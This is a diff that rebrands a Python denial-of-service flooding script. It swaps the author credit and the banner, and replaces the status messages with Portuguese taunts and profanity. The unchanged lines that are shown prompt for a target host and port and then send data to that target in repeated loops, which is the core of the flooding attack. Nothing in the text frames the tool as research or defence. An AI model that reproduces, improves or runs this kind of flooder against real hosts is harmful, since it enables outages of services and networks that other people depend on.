@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 #Code by LeeOn123
-#Codigo melhorado 2x por Elbielzinho
+#Codigo melhorado 2x por TR3MB4LA
 import sys
 import os
 import time
@@ -18,8 +18,8 @@ year = now.year
 
 os.system("figlet DDoS/Packet")
 print("")
-print("--> Script Melhorado V2 <--")
-print("--> Criador Elbielzinho <--")
+print("--> Canal TR3MB4LA <--")
+print("--> Script Ddos V1 <--")
 print("")
 ip = str(input(" Host/Ip:"))
 port = int(input(" Port:"))
@@ -38,7 +38,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(" ENVIANDO PACKET COM SUCESSO")
+			print(" KKKKKKKKK TOMA DDOS VAGABUNDO")
 			print("")
 		except:
 			print("DDoS/Packet ERROR")
@@ -54,7 +54,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(" ENVIANDO DDOS COM SUCESSO")
+			print(" SE FUDEU")
 			print("")
 		except:
 			s.close()
